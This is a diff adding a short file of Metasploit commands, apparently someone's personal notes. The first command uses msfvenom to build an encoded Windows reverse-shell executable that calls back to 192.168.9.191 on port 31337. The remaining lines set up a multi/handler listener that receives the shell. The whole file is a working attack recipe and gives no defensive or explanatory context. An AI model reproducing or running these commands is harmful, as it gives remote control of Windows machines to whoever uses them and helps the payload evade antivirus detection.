@@ -1,0 +1,22 @@
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.168.9.191 LPORT=31337 -b "\x00" -e x86/shikata_ga_nai -f exe –o /tmp/1.exe
+
+
+msfconsole
+
+use exploit/multi/handler
+
+set payload windows/shell/reverse_tcp
+
+windows/shell/reverse_tcp
+
+Show options
+
+set LHOST 192.168.9.191
+
+LHOST => 192.168.9.191
+
+set LPORT 31337
+
+LPORT => 31337
+
+exploit
